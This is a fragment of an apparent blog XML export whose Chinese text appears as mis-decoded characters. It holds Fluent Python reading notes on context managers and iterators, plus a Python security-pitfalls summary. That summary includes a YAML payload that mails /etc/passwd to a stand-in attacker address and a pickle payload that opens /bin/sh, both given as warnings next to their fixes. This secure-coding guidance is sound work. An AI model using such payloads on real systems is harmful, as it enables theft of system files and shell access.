        <tag>åŠ¨æ€ç±»å‹è¯­è¨€</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fluent python ç¬¬åäº”ç«  ä¸Šä¸‹æ–‡ç®¡ç†å™¨å’Œ else å—]]></title>
    <url>%2F2019%2F04%2F26%2Ffluent-python-15%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬åäº”ç« è¯»ä¹¦ç¬”è®° Chapter 15. Context Managers and else Blocksç¬¬åäº”ç« : ä¸Šä¸‹æ–‡ç®¡ç†å™¨å’Œ else å—æœ¬ç« ä¸»è¦ä¼šè®¨è®ºpythonä¸­çš„æµç¨‹æ§åˆ¶ç‰¹æ€§ withè¯­å¥å’Œä¸Šä¸‹æ–‡ç®¡ç†å™¨ for, while, try è¯­å¥çš„elseå­å¥ with è¯­å¥ä¼šè®¾ç½®ä¸€ä¸ªä¸´æ—¶çš„ä¸Šä¸‹æ–‡ï¼Œäº¤ç»™ä¸Šä¸‹æ–‡ç®¡ç†å™¨å¯¹è±¡æ§åˆ¶ï¼Œå¹¶ä¸”è´Ÿè´£æ¸…ç†ä¸Šä¸‹æ–‡ã€‚è¿™ä¹ˆåšèƒ½é¿å…é”™è¯¯å¹¶å‡å°‘æ ·æ¿ä»£ç ï¼Œå› æ­¤ API æ›´å®‰å…¨ï¼Œè€Œä¸”æ›´æ˜“äºä½¿ç”¨ã€‚é™¤äº†è‡ªåŠ¨å…³é—­æ–‡ä»¶ä¹‹å¤–ï¼Œwith å—è¿˜æœ‰å¾ˆå¤šç”¨é€”ã€‚else å­å¥ä¸ with è¯­å¥å®Œå…¨æ²¡æœ‰å…³ç³»ã€‚ä½†æ˜¯ä¹Ÿæ¶‰åŠåˆ°æµç¨‹æ§åˆ¶ã€‚ 15.1 ifè¯­å¥ä¹‹å¤–çš„elseå—else å­å¥ä¸ä»…èƒ½åœ¨ if è¯­å¥ä¸­ä½¿ç”¨ï¼Œè¿˜èƒ½åœ¨ forã€while å’Œ try è¯­å¥ä¸­ä½¿ç”¨ã€‚ for/elseã€while/else å’Œ try/else çš„è¯­ä¹‰å…³ç³»ç´§å¯†ï¼Œä¸è¿‡ä¸ if/else å·®åˆ«å¾ˆå¤§ã€‚else å­å¥çš„è¡Œä¸ºå¦‚ä¸‹ï¼š forä»…å½“ for å¾ªç¯è¿è¡Œå®Œæ¯•æ—¶ï¼ˆå³ for å¾ªç¯æ²¡æœ‰è¢« break è¯­å¥ä¸­æ­¢ï¼‰æ‰è¿è¡Œ else å—ã€‚ whileä»…å½“ while å¾ªç¯å› ä¸ºæ¡ä»¶ä¸ºFalseè€Œé€€å‡ºæ—¶ï¼ˆå³ while å¾ªç¯æ²¡æœ‰è¢« break è¯­å¥ä¸­æ­¢ï¼‰æ‰è¿è¡Œ else å—ã€‚ tryä»…å½“ try å—ä¸­æ²¡æœ‰å¼‚å¸¸æŠ›å‡ºæ—¶æ‰è¿è¡Œ else å—ã€‚å®˜æ–¹æ–‡æ¡£è¿˜æŒ‡å‡ºï¼šâ€œelse å­å¥æŠ›å‡ºçš„å¼‚å¸¸ä¸ä¼šç”±å‰é¢çš„ except å­å¥å¤„ç†ã€‚â€åœ¨æ‰€æœ‰æƒ…å†µä¸‹ï¼Œå¦‚æœå¼‚å¸¸æˆ–è€… returnã€break æˆ– continue è¯­å¥å¯¼è‡´æ§åˆ¶æƒè·³åˆ°äº†å¤åˆè¯­å¥çš„ä¸»å—ä¹‹å¤–ï¼Œelse å­å¥ä¹Ÿä¼šè¢«è·³è¿‡ã€‚ åœ¨ Python ä¸­ï¼Œtry/except ä¸ä»…ç”¨äºå¤„ç†é”™è¯¯ï¼Œè¿˜å¸¸ç”¨äºæ§åˆ¶æµç¨‹ã€‚ä¸ºæ­¤ï¼ŒPython å®˜æ–¹è¯æ±‡è¡¨è¿˜å®šä¹‰äº†ä¸¤ä¸ªç¼©ç•¥è¯ï¼ˆå£å·ï¼‰ã€‚ EAFP å–å¾—åŸè°…æ¯”è·å¾—è®¸å¯å®¹æ˜“ï¼ˆeasier to ask for forgiveness than permissionï¼‰ã€‚è¿™æ˜¯ä¸€ç§å¸¸è§çš„ Python ç¼–ç¨‹é£æ ¼ï¼Œå…ˆå‡å®šå­˜åœ¨æœ‰æ•ˆçš„é”®æˆ–å±æ€§ï¼Œå¦‚æœå‡å®šä¸æˆç«‹ï¼Œé‚£ä¹ˆæ•è·å¼‚å¸¸ã€‚è¿™ç§é£æ ¼ç®€å•æ˜å¿«ï¼Œç‰¹ç‚¹æ˜¯ä»£ç ä¸­æœ‰å¾ˆå¤š try å’Œ except è¯­å¥ã€‚ä¸å…¶ä»–å¾ˆå¤šè¯­è¨€ä¸€æ ·ï¼ˆå¦‚ C è¯­è¨€ï¼‰ï¼Œè¿™ç§é£æ ¼çš„å¯¹ç«‹é¢æ˜¯ LBYL é£æ ¼ã€‚æ¥ä¸‹æ¥ï¼Œè¯æ±‡è¡¨å®šä¹‰äº† LBYLã€‚ LBYL ä¸‰æ€è€Œåè¡Œï¼ˆlook before you leapï¼‰ã€‚è¿™ç§ç¼–ç¨‹é£æ ¼åœ¨è°ƒç”¨å‡½æ•°æˆ–æŸ¥æ‰¾å±æ€§æˆ–é”®ä¹‹å‰æ˜¾å¼æµ‹è¯•å‰ææ¡ä»¶ã€‚ä¸ EAFP é£æ ¼ç›¸åï¼Œè¿™ç§é£æ ¼çš„ç‰¹ç‚¹æ˜¯ä»£ç ä¸­æœ‰å¾ˆå¤š if è¯­å¥ã€‚åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ï¼ŒLBYL é£æ ¼å¯èƒ½ä¼šåœ¨â€œæ£€æŸ¥â€å’Œâ€œè¡Œäº‹â€çš„ç©ºå½“å¼•å…¥æ¡ä»¶ç«äº‰ã€‚ä¾‹å¦‚ï¼Œå¯¹ if key in mapping: return mapping[key] è¿™æ®µä»£ç æ¥è¯´ï¼Œå¦‚æœåœ¨æµ‹è¯•ä¹‹åï¼Œä½†åœ¨æŸ¥æ‰¾ä¹‹å‰ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹ä»æ˜ å°„ä¸­åˆ é™¤äº†é‚£ä¸ªé”®ï¼Œé‚£ä¹ˆè¿™æ®µä»£ç å°±ä¼šå¤±è´¥ã€‚è¿™ä¸ªé—®é¢˜å¯ä»¥ä½¿ç”¨é”æˆ–è€… EAFP é£æ ¼è§£å†³ã€‚å¦‚æœé€‰æ‹©ä½¿ç”¨ EAFP é£æ ¼ï¼Œé‚£å°±è¦æ›´æ·±å…¥åœ°äº†è§£ else å­å¥ï¼Œå¹¶åœ¨ try/except è¯­å¥ä¸­åˆç†ä½¿ç”¨ã€‚ 15.2 withå—å’Œä¸Šä¸‹æ–‡ç®¡ç†ä¸Šä¸‹æ–‡ç®¡ç†å™¨å¯¹è±¡å­˜åœ¨çš„ç›®çš„æ˜¯ç®¡ç† with è¯­å¥ï¼Œå°±åƒè¿­ä»£å™¨çš„å­˜åœ¨æ˜¯ä¸ºäº†ç®¡ç† for è¯­å¥ ä¸€æ ·ã€‚ with è¯­å¥çš„ç›®çš„æ˜¯ç®€åŒ– try/finally æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼ç”¨äºä¿è¯ä¸€æ®µä»£ç è¿è¡Œå®Œæ¯•åæ‰§è¡ŒæŸé¡¹æ“ä½œï¼Œå³ä¾¿é‚£æ®µä»£ç ç”±äºå¼‚å¸¸ã€return è¯­å¥æˆ– sys.exit() è°ƒç”¨è€Œä¸­æ­¢ï¼Œä¹Ÿä¼šæ‰§è¡ŒæŒ‡å®šçš„æ“ä½œã€‚finally å­å¥ä¸­çš„ä»£ç é€šå¸¸ç”¨äºé‡Šæ”¾é‡è¦çš„èµ„æºï¼Œæˆ–è€…è¿˜åŸä¸´æ—¶å˜æ›´çš„çŠ¶æ€ã€‚ ä¸Šä¸‹æ–‡ç®¡ç†å™¨åè®®åŒ…å« __enter__ å’Œ __exit__ ä¸¤ä¸ªæ–¹æ³•ã€‚with è¯­å¥å¼€å§‹è¿è¡Œæ—¶ï¼Œä¼šåœ¨ ä¸Šä¸‹æ–‡ç®¡ç†å™¨å¯¹è±¡ä¸Šè°ƒç”¨ __enter__ æ–¹æ³•ã€‚with è¯­å¥è¿è¡Œç»“æŸåï¼Œä¼šåœ¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨å¯¹è±¡ä¸Šè°ƒç”¨ __exit__ æ–¹æ³•ï¼Œä»¥æ­¤æ‰®æ¼” finally å­å¥çš„è§’è‰²ã€‚ æœ€å¸¸è§çš„ä¾‹å­æ˜¯ç¡®ä¿æ–‡ä»¶å¯¹è±¡è¢«å…³é—­ã€‚åœ¨é€€å‡ºäº†withå—åï¼Œæ–‡ä»¶å¯¹è±¡å˜æˆäº†åªèƒ½è¯»å–å±æ€§è€Œä¸èƒ½è¿›è¡ŒIOæ“ä½œçš„å¯¹è±¡ã€‚ ä¸æ˜“å¯Ÿè§‰ä½†å¾ˆé‡è¦çš„ä¸€ç‚¹ï¼šæ‰§è¡Œ with åé¢çš„è¡¨è¾¾ å¼å¾—åˆ°çš„ç»“æœæ˜¯ä¸Šä¸‹æ–‡ç®¡ç†å™¨å¯¹è±¡ï¼Œä¸è¿‡ï¼ŒæŠŠå€¼ç»‘å®šåˆ°ç›®æ ‡å˜é‡ä¸Šï¼ˆas å­å¥ï¼‰æ˜¯åœ¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨å¯¹è±¡ä¸Šè°ƒç”¨ __enter__ æ–¹æ³•çš„ç»“æœã€‚ä¸ç®¡æ§åˆ¶æµç¨‹ä»¥å“ªç§æ–¹å¼é€€å‡º with å—ï¼Œéƒ½ä¼šåœ¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨å¯¹è±¡ä¸Šè°ƒç”¨ __exit__ æ–¹ æ³•ï¼Œè€Œä¸æ˜¯åœ¨ __enter__ æ–¹æ³•è¿”å›çš„å¯¹è±¡ä¸Šè°ƒç”¨ã€‚ 15.3 contextlib æ ‡å‡†åº“ä¸­çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨contextlib æ¨¡å—ä¸­æœ‰ä¸€äº›ç±»å’Œå‡½æ•°ä½¿ç”¨èŒƒå›´å¾ˆå¹¿ã€‚ closing å¦‚æœå¯¹è±¡æä¾›äº† close() æ–¹æ³•ï¼Œä½†æ²¡æœ‰å®ç° enter/exit åè®®ï¼Œé‚£ä¹ˆå¯ä»¥ ä½¿ç”¨è¿™ä¸ªå‡½æ•°æ„å»ºä¸Šä¸‹æ–‡ç®¡ç†å™¨ã€‚ suppress æ„å»ºä¸´æ—¶å¿½ç•¥æŒ‡å®šå¼‚å¸¸çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨ã€‚ @contextmanager è¿™ä¸ªè£…é¥°å™¨æŠŠç®€å•çš„ç”Ÿæˆå™¨å‡½æ•°å˜æˆä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œè¿™æ ·å°±ä¸ç”¨åˆ›å»ºç±»å»å®ç°ç®¡ç†å™¨åè®®äº†ã€‚ ContextDecorator è¿™æ˜¯ä¸ªåŸºç±»ï¼Œç”¨äºå®šä¹‰åŸºäºç±»çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨ã€‚è¿™ç§ä¸Šä¸‹æ–‡ç®¡ç†å™¨ä¹Ÿèƒ½ç”¨äºè£…é¥°å‡½æ•°ï¼Œåœ¨å—ç®¡ç†çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œæ•´ä¸ªå‡½æ•°ã€‚ ExitStack è¿™ä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨èƒ½è¿›å…¥å¤šä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨ã€‚with å—ç»“æŸæ—¶ï¼ŒExitStack æŒ‰ç…§åè¿› å…ˆå‡ºçš„é¡ºåºè°ƒç”¨æ ˆä¸­å„ä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨çš„ exit æ–¹æ³•ã€‚å¦‚æœäº‹å…ˆä¸çŸ¥é“ with å—è¦è¿›å…¥å¤šå°‘ä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªç±»ã€‚ä¾‹å¦‚ï¼ŒåŒæ—¶æ‰“å¼€ä»»æ„ä¸€ä¸ªæ–‡ä»¶åˆ—è¡¨ä¸­çš„æ‰€æœ‰æ–‡ä»¶ã€‚ æ˜¾ç„¶ï¼Œåœ¨è¿™äº›å®ç”¨å·¥å…·ä¸­ï¼Œä½¿ç”¨æœ€å¹¿æ³›çš„æ˜¯ @contextmanager è£…é¥°å™¨ï¼Œå› æ­¤è¦æ ¼å¤–ç•™å¿ƒã€‚è¿™ä¸ªè£…é¥°å™¨ä¹Ÿæœ‰è¿·æƒ‘äººçš„ä¸€é¢ï¼Œå› ä¸ºå®ƒä¸è¿­ä»£æ— å…³ï¼Œå´è¦ä½¿ç”¨ yield è¯­å¥ã€‚ç”±æ­¤å¯ä»¥å¼•å‡ºåç¨‹ï¼Œè¿™æ˜¯ä¸‹ä¸€ç« çš„ä¸»é¢˜ã€‚ åœ¨ä½¿ç”¨ @contextmanager è£…é¥°çš„ç”Ÿæˆå™¨ä¸­ï¼Œyield è¯­å¥çš„ä½œç”¨æ˜¯æŠŠå‡½æ•°çš„å®šä¹‰ä½“åˆ†æˆä¸¤ éƒ¨åˆ†ï¼šyield è¯­å¥å‰é¢çš„æ‰€æœ‰ä»£ç åœ¨ with å—å¼€å§‹æ—¶ï¼ˆå³è§£é‡Šå™¨è°ƒç”¨ __enter__ æ–¹æ³• æ—¶ï¼‰æ‰§è¡Œï¼Œ yield è¯­å¥åé¢çš„ä»£ç åœ¨ with å—ç»“æŸæ—¶ï¼ˆå³è°ƒç”¨ __exit__ æ–¹æ³•æ—¶ï¼‰æ‰§è¡Œã€‚ ä¸€ä¸ªä¾‹å­ï¼š 123456789101112131415161718192021import contextlib@contextlib.contextmanager def looking_glass(): import sys original_write = sys.stdout.write def reverse_write(text): original_write(text[::-1]) sys.stdout.write = reverse_write msg = '' try: yield 'JABBERWOCKY' except ZeroDivisionError: msg = 'Please DO NOT divide by zero!' finally: sys.stdout.write = original_write if msg: print(msg) ä½¿ç”¨ @contextmanager è£…é¥°å™¨æ—¶ï¼Œè¦æŠŠ yield è¯­å¥æ”¾åœ¨ try/finally è¯­å¥ ä¸­ï¼ˆæˆ–è€…æ”¾åœ¨ with è¯­å¥ä¸­ï¼‰ï¼Œè¿™æ˜¯æ— æ³•é¿å…çš„ï¼Œå› ä¸ºæˆ‘ä»¬æ°¸è¿œä¸çŸ¥é“ä¸Šä¸‹æ–‡ç®¡ç†å™¨ çš„ç”¨æˆ·ä¼šåœ¨ with å—ä¸­åšä»€ä¹ˆã€‚ åœ¨è¿™èŠ‚çš„ä¾‹å­ä¸­yield ä¸è¿­ä»£æ²¡æœ‰ä»»ä½•å…³ç³»ã€‚åœ¨æœ¬ èŠ‚æ‰€ä¸¾çš„ç¤ºä¾‹ä¸­ï¼Œç”Ÿæˆå™¨å‡½æ•°çš„ä½œç”¨æ›´åƒæ˜¯åç¨‹ï¼šæ‰§è¡Œåˆ°æŸä¸€ç‚¹æ—¶æš‚åœï¼Œè®©å®¢æˆ·ä»£ç è¿ è¡Œï¼Œç›´åˆ°å®¢æˆ·è®©åç¨‹ç»§ç»­åšäº‹ã€‚ 15.4 å°ç»“ è®¨è®ºäº† forã€while å’Œ try è¯­å¥çš„ else å­å¥ã€‚ ç„¶åï¼Œæœ¬ç« è®¨è®ºäº†ä¸Šä¸‹æ–‡ç®¡ç†å™¨å’Œ with è¯­å¥çš„ä½œç”¨ã€‚ æœ€åï¼Œæˆ‘ä»¬åˆ†æäº†æ ‡å‡†åº“ä¸­ contextlib æ¨¡å—é‡Œçš„å‡½æ•°ã€‚ @contextmanager è£…é¥°å™¨ä¼˜é›…ä¸”å®ç”¨ï¼ŒæŠŠä¸‰ä¸ªä¸åŒçš„ Python ç‰¹æ€§ç»“åˆåˆ°äº†ä¸€èµ·ï¼šå‡½æ•°è£… é¥°å™¨ã€ç”Ÿæˆå™¨å’Œ with è¯­å¥ã€‚]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Context Manager</tag>
        <tag>ä¸Šä¸‹æ–‡ç®¡ç†å™¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python çš„åä¸ªå®‰å…¨é—®é¢˜]]></title>
    <url>%2F2019%2F04%2F26%2Fpython-sercurity-10-problems%2F</url>
    <content type="text"><![CDATA[æœ¬æ–‡ä»‹ç»äº†Pythonä¸­å¯èƒ½å‡ºç°çš„åä¸ªå®‰å…¨é—®é¢˜ã€‚ åŸæ–‡:https://hackernoon.com/10-common-security-gotchas-in-python-and-how-to-avoid-them-e19fbe265e03 1. è¾“å…¥æ³¨å…¥ SQL æ³¨å…¥: å®¹æ˜“å‘ç”Ÿåœ¨Pythonä¸­å†™raw sqlè¿›è¡ŒæŸ¥è¯¢çš„åœºæ™¯ã€‚ è§£å†³æ–¹å¼:å°½é‡ç”¨ORMï¼Œå¦‚æœè¦å†™raw sql, å°½é‡ç†Ÿæ‚‰SQLæ³¨å…¥cheatsheet å‘½ä»¤æ³¨å…¥: å®¹æ˜“å‘ç”Ÿåœ¨os.popen(), subprocess.Popen()ç­‰åœºåˆ ä½¿ç”¨shelexæ¨¡å—ä¿è¯å¼•å·çš„è½¬ä¹‰æ˜¯æ­£ç¡®çš„ 2.è§£æXMLå¤§å¤šå‘ç”Ÿåœ¨è§£æä¸è¢«ä¿¡ä»»çš„xml(non-trusted xml) billion lols å¤–éƒ¨å®ä½“æ‹“å±• ä¸å®‰å…¨çš„éæ ‡å‡†åº“ è§£å†³æ–¹å¼: ä½¿ç”¨è¾ƒä¸ºå®‰å…¨çš„è§£æåº“è¿›è¡Œè§£æï¼Œå…¥defusedxml 3. æ–­è¨€è¯­å¥ä¸è¦ç”¨æ–­è¨€å¯¹ç”¨æˆ·çš„æƒé™è¿›è¡Œåˆ¤æ–­ 123def foo(request, user): assert user.is_admin, â€œuser does not have accessâ€ # secure code... ç”Ÿäº§ç¯å¢ƒä¸­ä¼šç›´æ¥è·³è¿‡assertç›´æ¥è¿›è¡Œç”¨æˆ·å¯èƒ½æ²¡æœ‰æƒé™çš„æ“ä½œ è§£å†³æ–¹å¼: æ–­è¨€åªç”¨åœ¨ä¸å…¶ä»–å¼€å‘è€…äº¤äº’çš„åœºæ™¯ï¼Œæ¯”å¦‚apiè°ƒç”¨æ£€æŸ¥å’Œå•å…ƒæµ‹è¯• 4.timing attackæ”»å‡»è€…é€šè¿‡å¯¹æ¯”è¾ƒæŒ‡å®šåŠ å¯†å€¼çš„æ—¶é•¿åˆ¤æ–­æ¯”è¾ƒå™¨çš„è¡Œä¸ºå’Œä½¿ç”¨ç®—æ³•ã€‚ç”±äºè¿™ç§æ”»å‡»å¾ˆä¾èµ–æ—¶é—´çš„å‡†ç¡®åº¦ï¼Œå¾ˆå°‘æœ‰è¿œç¨‹çš„æ”»å‡»ï¼Œæ›´å¤šçš„æ˜¯å¯¹ä¸€äº›å‘½ä»¤è¡Œå·¥å…·è¿›è¡Œç ´è§£ã€‚æ—¶é—´æ”»å‡»çš„ä»‹ç»ä¸€ä¸ªä¾‹å­SSH-based timing attack è§£å†³æ–¹å¼:ä½¿ç”¨Python 3.5 ä¸­å¼•å…¥çš„secrets.compare_digest è¿›è¡Œæ•æ„Ÿå­—ç¬¦ä¸²çš„æ¯”è¾ƒ site-packages æ±¡æŸ“Pythonçš„åŒ…å¼•ç”¨éå¸¸çš„çµæ´»ï¼Œè¿™ä½¿å¾—çŒ´å­è¡¥ä¸å’Œæ ‡å‡†åº“å‡½æ•°çš„é‡å†™éå¸¸å®¹æ˜“ï¼Œä½†ä¹Ÿé€ æˆäº†æœ€å¤§çš„å®‰å…¨æ¼æ´ä¹‹ä¸€ã€‚å‡ºç°åœºæ™¯: æ”»å‡»è€…åœ¨Pypiä¸­ä½¿ç”¨ä¸æµè¡Œåº“åç§°ç›¸ä¼¼çš„åº“å è§£å†³æ–¹å¼:çœ¼ç¥è¦å¥½ï¼Œä¸è¦æ‰‹æŠ–ä½¿ç”¨virtualenv ä¿æŒå…¨å±€site-packagesçš„æ¸…æ´ä¸‹è½½åŒ…æ—¶æ ¸å¯¹ç­¾å ä¸´æ—¶æ–‡ä»¶æ”»å‡»åœ¨ä½ ä½¿ç”¨mktemp()åˆ›å»ºä¸´æ—¶æ–‡ä»¶åå’Œå¤„ç†ä¸´æ—¶æ–‡ä»¶ä¹‹å‰ä¿®æ”¹ä¸´æ—¶æ–‡ä»¶ã€‚ è§£å†³æ–¹æ¡ˆ:ä½¿ç”¨tempfileæ¨¡å—å’Œmkstemp()åˆ›å»ºä¸´æ—¶æ–‡ä»¶ ä½¿ç”¨yaml.loadåœ¨yamlçš„loadè¿‡ç¨‹ä¸­ä¼šå‡ºç°å®‰å…¨é—®é¢˜ä¾‹å¦‚åœ¨yamlä¸­åŠ å…¥è¿™ä¸€å¥1!!python/object/apply:os.system ["cat /etc/passwd | mail me@hack.c"] è§£å†³æ–¹æ³•:yaml.s_load è§£æpickelä¾‹:123456789import cPickleimport subprocessimport base64class RunBinSh(object): def __reduce__(self): return (subprocess.Popen, (('/bin/sh',),))print base64.b64encode(cPickle.dumps(RunBinSh())) ä»¥ä¸Šæ˜¯å°†æ‰“å¼€shellçš„ç¨‹åºæ‰“åŒ…åˆ°pickelçš„ä»£ç  è§£å†³æ–¹æ¡ˆ:åƒä¸‡ä¸è¦ä»æœªçŸ¥æºè§£æpickel ä½¿ç”¨ç³»ç»ŸPython, ä¸æ‰“è¡¥ä¸ä½¿ç”¨ç³»ç»Ÿæä¾›çš„Pythonç‰ˆæœ¬å¯èƒ½æœ‰å¾ˆå¤šæœªä¿®å¤çš„æ¼æ´ è§£å†³æ–¹å¼:ä½¿ç”¨æ–°ç‰ˆPythonï¼Œä¸ºç³»ç»ŸPython æ‰“è¡¥ä¸ ä¸ç»™Pythonçš„ä¾èµ–æ‰“è¡¥ä¸åŒä¸Š]]></content>
      <categories>
        <category>éšæ‰‹æ‘˜å½•</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>å®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fluent python ç¬¬åå››ç«  å¯è¿­ä»£å¯¹è±¡ï¼Œè¿­ä»£å™¨å’Œç”Ÿæˆå™¨]]></title>
    <url>%2F2018%2F09%2F20%2Ffluent-python-14%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬åå››ç« è¯»ä¹¦æŠ¥å‘Š Chapter 14. Iterables, Iterators, and GeneratorsOperatorç¬¬åå››ç« : å¯è¿­ä»£å¯¹è±¡ï¼Œè¿­ä»£å™¨å’Œç”Ÿæˆå™¨è¿­ä»£æ˜¯æ•°æ®å¤„ç†çš„åŸºçŸ³ã€‚æ‰«é¢å†…å­˜ä¸­æ”¾ä¸ä¸‹çš„æ•°æ®é›†æ—¶ï¼Œ æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ç§æƒ°æ€§è·å–æ•°æ®çš„æ–¹å¼ï¼Œå³æŒ‰éœ€æ¯æ¬¡è·å–ä¸€ä¸ªæ•°æ®é¡¹ã€‚è¿™å°±æ˜¯è¿­ä»£å™¨æ¨¡å¼(Iterator Pattern).ä¸‹é¢ä¼šè¯´æ˜Pythonè¯­è¨€æ˜¯å¦‚ä½•å†…ç½®è¿­ä»£å™¨æ¨¡å¼çš„ã€‚ æ‰€æœ‰ç”Ÿæˆå™¨éƒ½æ˜¯è¿­ä»£å™¨ï¼Œå› ä¸ºç”Ÿæˆå™¨å®Œå…¨å®ç°äº†è¿­ä»£å™¨æ¥å£ã€‚ä¸è¿‡ï¼Œæ ¹æ®ã€Šè®¾è®¡æ¨¡å¼ï¼šå¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€ã€‹ä¸€ä¹¦çš„å®šä¹‰ï¼Œè¿­ä»£å™¨ç”¨äºä»é›†åˆä¸­å–å‡ºå…ƒç´ ï¼›è€Œç”Ÿæˆå™¨ç”¨äºâ€œå‡­ç©ºâ€ç”Ÿæˆå…ƒç´ ã€‚é€šè¿‡æ–æ³¢çº³å¥‘æ•°åˆ—èƒ½å¾ˆå¥½åœ°è¯´æ˜äºŒè€…ä¹‹é—´çš„åŒºåˆ«ï¼šæ–æ³¢çº³å¥‘æ•°åˆ—ä¸­çš„æ•°æœ‰æ— ç©·ä¸ªï¼Œåœ¨ä¸€ä¸ªé›†åˆé‡Œæ”¾ä¸ä¸‹ã€‚ä¸è¿‡è¦çŸ¥é“ï¼Œåœ¨ Python ç¤¾åŒºä¸­ï¼Œå¤§å¤šæ•°æ—¶å€™éƒ½æŠŠè¿­ä»£å™¨å’Œç”Ÿæˆå™¨è§†ä½œåŒä¸€æ¦‚å¿µã€‚ Python3 ä¸­ï¼Œ ç”Ÿæˆå™¨æœ‰å¹¿æ³›çš„ç”¨é€”ï¼Œ ä¾‹å¦‚range() åœ¨Python2ä¸­è¿”å›åˆ—è¡¨ï¼Œ åœ¨3ä¸­è¿”å›ä¸€ä¸ªç±»ä¼¼ç”Ÿæˆå™¨çš„å¯¹è±¡ã€‚ åœ¨Pythonè¯­è¨€å†…éƒ¨ï¼Œ è¿­ä»£å™¨ç”¨äºæ”¯æŒ: forå¾ªç¯ æ„å»ºå’Œæ‰©å±•é›†åˆç±»å‹ é€è¡Œéå†æ–‡æœ¬æ–‡ä»¶ åˆ—è¡¨æ¨å¯¼ï¼Œ å­—å…¸æ¨å¯¼å’Œé›†åˆæ¨å¯¼ å…ƒç»„æ‹†åŒ… è°ƒç”¨å‡½æ•°æ—¶ä½¿ç”¨*æ‹†åŒ…å®å‚ æœ¬ç« å°†è®¨è®ºï¼š è¯­è¨€å†…éƒ¨ä½¿ç”¨iter()å†…ç½®å‡½æ•°å¤„ç†å¯è¿­ä»£å¯¹è±¡çš„æ–¹å¼ å¦‚ä½•ä½¿ç”¨Pythonå®ç°ç»å…¸çš„è¿­ä»£å™¨æ¨¡å¼ è¯´æ˜ç”Ÿæˆå™¨å‡½æ•°çš„å·¥ä½œåŸç† å¦‚ä½•ä½¿ç”¨ç”Ÿæˆå™¨å‡½æ•°æˆ–ç”Ÿæˆå™¨è¡¨è¾¾å¼ä»£æ›¿ç»å…¸çš„è¿­ä»£å™¨ å¦‚ä½•ä½¿ç”¨æ ‡å‡†åº“ä¸­é€šç”¨çš„ç”Ÿæˆå™¨å‡½æ•° å¦‚ä½•ä½¿ç”¨yeild from è¯­å¥åˆå¹¶ç”Ÿæˆå™¨ ä¸ºä»€ä¹ˆç”Ÿæˆå™¨å’Œåç¨‹çœ‹ä¼¼ç›¸åŒå®åˆ™å·®åˆ«å¾ˆå¤§ï¼Œ ä¸èƒ½æ··æ·† 14.1 ä»åºåˆ—å¼€å§‹æˆ‘ä»¬é¦–å…ˆå®ç°ä¸€ä¸ªSentenceç±»ï¼Œ é€šè¿‡ç´¢å¼•ä»æ–‡æœ¬æå–å•è¯ã€‚ 12345678910111213import reimport reprlib RE_WORD = re.compile('\w+') class Sentence: def __init__(self, text): self.text = text self.words = RE_WORD.findall(text) def __getitem__(self, index): return self.words[index] def __len__(self): return len(self.words) def __repr__(self): return 'Sentence(%s)' % reprlib.repr(self.text) åºåˆ—å¯ä»¥è¿­ä»£çš„åŸå› ï¼šiterå‡½æ•°ã€‚è§£é‡Šå™¨éœ€è¦è¿­ä»£å¯¹è±¡ x æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ iter(x)ã€‚å†…ç½®çš„ iter å‡½æ•°æœ‰ä»¥ä¸‹ä½œç”¨ã€‚(1) æ£€æŸ¥å¯¹è±¡æ˜¯å¦å®ç°äº† __iter__ æ–¹æ³•ï¼Œå¦‚æœå®ç°äº†å°±è°ƒç”¨å®ƒï¼Œè·å–ä¸€ä¸ªè¿­ä»£å™¨ã€‚(2) å¦‚æœæ²¡æœ‰å®ç° __iter__ æ–¹æ³•ï¼Œä½†æ˜¯å®ç°äº† __getitem__ æ–¹æ³•ï¼ŒPython ä¼šåˆ›å»ºä¸€ä¸ªè¿­ä»£å™¨ï¼Œå°è¯•æŒ‰é¡ºåºï¼ˆä»ç´¢å¼• 0 å¼€å§‹ï¼‰è·å–å…ƒç´ ã€‚(3) å¦‚æœå°è¯•å¤±è´¥ï¼ŒPython æŠ›å‡º TypeError å¼‚å¸¸ï¼Œé€šå¸¸ä¼šæç¤ºâ€œC object is not iterableâ€ï¼ˆCå¯¹è±¡ä¸å¯è¿­ä»£ï¼‰ï¼Œå…¶ä¸­ C æ˜¯ç›®æ ‡å¯¹è±¡æ‰€å±çš„ç±»ã€‚ä»»ä½• Python åºåˆ—éƒ½å¯è¿­ä»£çš„åŸå› æ˜¯ï¼Œå®ƒä»¬éƒ½å®ç°äº† __getitem__ æ–¹æ³•ã€‚å…¶å®ï¼Œæ ‡å‡†çš„åºåˆ—ä¹Ÿéƒ½å®ç°äº† __iter__ æ–¹æ³• 14.2 å¯è¿­ä»£å¯¹è±¡å’Œè¿­ä»£å™¨ä¸Šé¢ä¸€å°èŠ‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿­ä»£å™¨çš„å®šä¹‰ï¼š ä½¿ç”¨ iter å†…ç½®å‡½æ•°å¯ä»¥è·å–è¿­ä»£å™¨çš„å¯¹è±¡ã€‚å¦‚æœå¯¹è±¡å®ç°äº†èƒ½è¿”å›è¿­ä»£å™¨çš„__iter__ 